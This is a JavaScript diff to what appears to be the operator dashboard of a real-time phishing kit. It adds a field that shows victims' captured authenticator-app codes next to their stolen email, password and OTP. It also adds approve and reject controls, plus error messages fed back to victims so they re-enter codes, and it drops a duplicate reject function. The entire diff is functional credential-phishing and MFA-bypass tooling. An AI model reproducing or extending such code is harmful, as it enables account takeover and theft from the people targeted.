@@ -645,6 +645,24 @@ function displayVictimInfo(victimInfos) {
             `;
         }
         
+        if (victim.login_authenticator_app_code) {
+            victimHTML += `
+                <div class="mb-3">
+                    <div class="d-flex justify-content-between align-items-center mb-2">
+                        <label class="text-muted small fw-medium d-block">
+                            <i class="bi bi-shield-check me-1"></i>Authenticator App Code
+                        </label>
+                        <div class="approval-controls">
+                            ${getApprovalControls(victim.id, 'authenticator', victim.authenticator_status)}
+                        </div>
+                    </div>
+                    <div class="fw-bold font-monospace bg-white bg-opacity-50 p-2 rounded text-center" style="font-size: 1.1rem; letter-spacing: 2px;">
+                        ${victim.login_authenticator_app_code || '<span class="text-muted">Loading...</span>'}
+                    </div>
+                </div>
+            `;
+        }
+        
         if (victim.login_otp) {
             victimHTML += `
                 <div class="mb-3">
@@ -775,41 +793,7 @@ function approveSubmission(victimId, step) {
     });
 }
 
-// Function to reject a submission
-function rejectSubmission(victimId, step) {
-    const errorMessages = {
-        'email': 'Invalid email address',
-        'password': 'Incorrect password',
-        'otp': 'Invalid OTP code'
-    };
-    
-    const errorMessage = errorMessages[step] || 'Invalid information provided';
-    
-    fetch(`/reject/${victimId}/`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'X-CSRFToken': getCookie('csrftoken')
-        },
-        body: JSON.stringify({
-            step: step,
-            error_message: errorMessage
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.status === 'success') {
-            showNotification(`${step.charAt(0).toUpperCase() + step.slice(1)} rejected successfully!`, 'warning');
-            updateVictimInfo(); // Refresh the display
-        } else {
-            showNotification('Failed to reject submission', 'danger');
-        }
-    })
-    .catch(error => {
-        console.error('Error rejecting submission:', error);
-        showNotification('Failed to reject submission', 'danger');
-    });
-}
+// Function to reject a submission - removed duplicate
 
 // Function to approve a submission
 function approveSubmission(victimId, step) {
@@ -880,6 +864,7 @@ function getDefaultErrorMessage(step) {
     const messages = {
         'email': 'Invalid email address. Please enter a valid email.',
         'password': 'Incorrect password. Please try again.',
+        'authenticator': 'Invalid authenticator code. Please try again.',
         'otp': 'Invalid OTP code. Please check and try again.'
     };
     return messages[step] || 'Invalid information provided';
